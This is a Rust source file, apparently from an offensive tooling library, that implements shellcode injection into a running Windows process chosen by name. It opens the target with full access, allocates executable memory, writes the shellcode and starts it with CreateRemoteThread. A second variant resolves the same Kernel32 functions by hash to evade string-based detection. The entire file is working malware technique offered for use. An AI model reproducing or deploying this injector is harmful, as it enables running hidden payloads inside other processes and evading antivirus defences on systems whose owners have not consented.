extern crate windows;
use std::{mem, ptr};
use windows::Win32::Foundation::CHAR;
use windows::Win32::System::Diagnostics::ToolHelp::{PROCESSENTRY32, TH32CS_SNAPPROCESS};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32Next};
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Memory::VirtualAllocEx;
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess};
#[cfg(feature = "antistring")]
use core::ffi::c_void;
#[cfg(feature = "antistring")]
use windows::Win32::Foundation::{BOOL, HANDLE};
#[cfg(feature = "antistring")]
use windows::Win32::System::Diagnostics::ToolHelp::CREATE_TOOLHELP_SNAPSHOT_FLAGS;
#[cfg(feature = "antistring")]
use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
#[cfg(feature = "antistring")]
use windows::Win32::System::Threading::PROCESS_ACCESS_RIGHTS;

#[cfg(not(feature = "antistring"))]
pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
    // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
    let snapshot = unsafe { 
        match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) {
            Err(_) => panic!("Could not obtain handle to snapshot"),
            Ok(value) => value
        }
    };

    // Call Process32Next to iterate over all processes in the snapshot and look for the target process by name
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
    let mut pid: u32 = 0;
    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
        let mut process_name = String::from("");
        for element in process_entry.szExeFile {
            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
            if element_as_u8 == 0 {
                break
            }
            process_name.push(element_as_u8 as char);
        }
        if process_name.contains(target_process) {
            pid = process_entry.th32ProcessID;
            break;
        }
    }
    if pid == 0 {
        panic!("Could not find a {target_process} process");
    }

    // Call OpenProcess to get a handle to the target process via its PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
    let explorer_handle = unsafe { 
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Err(_) => panic!("Could not open a handle to the process"),
            Ok(value) => value
        }
    };

    // Call VirtualAllocEx to allocate memory for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Memory/fn.VirtualAllocEx.html
    let base_address = unsafe { VirtualAllocEx(explorer_handle, ptr::null(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };

    // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
    if !write_result.as_bool() {
        panic!("WriteProcessMemory failed");
    }

    // Call CreateRemoteThread to create the execution thread in the target PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    if unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) }.is_err() {
        panic!("CreateRemoteThread failed");
    }
}

#[cfg(feature = "antistring")]
pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
    // See line 28
    let function = rco_utils::find_function_address("Kernel32", 0x139872fd098af4a7).unwrap();
    let snapshot = unsafe {
        mem::transmute::<*const (), fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE>
        (function)(TH32CS_SNAPPROCESS, 0_u32)
    };

    // See line 38
    let function = rco_utils::find_function_address("Kernel32", 0x4cf400a249844bee).unwrap();
    let mut pid: u32 = 0;
    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
    while unsafe {
        mem::transmute::<*const (), fn(HANDLE, &mut PROCESSENTRY32) -> BOOL>
        (function)(snapshot, &mut process_entry).as_bool()
    } {
        let mut process_name = String::from("");
        for element in process_entry.szExeFile {
            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
            if element_as_u8 == 0 {
                break
            }
            process_name.push(element_as_u8 as char);
        }
        if process_name.contains(target_process) {
            pid = process_entry.th32ProcessID;
            break;
        }
    }
    if pid == 0 {
        panic!("Could not find a {target_process} process");
    }

    // See line 62
    let function = rco_utils::find_function_address("Kernel32", 0x2c116091e452cf52).unwrap();
    let explorer_handle = unsafe { 
        mem::transmute::<*const (), fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE>
        (function)(PROCESS_ALL_ACCESS, false, pid) 
    };

    // See line 72
    let function = rco_utils::find_function_address("Kernel32", 0x5cfd66a14ed9a43).unwrap();
    let base_address = unsafe {
        mem::transmute::<*const (), fn(HANDLE, *const u32, usize, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS) -> *const c_void>
        (function)(explorer_handle, ptr::null(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    };

    // See line 77
    let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
    unsafe { 
        mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
        (function)(explorer_handle, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut())
    };

    // See line 85
    let function = rco_utils::find_function_address("Kernel32", 0x2a0b247f3bdeef70).unwrap();
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    unsafe {
        mem::transmute::<*const (), fn(HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32)>
        (function)(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut())
    };
}
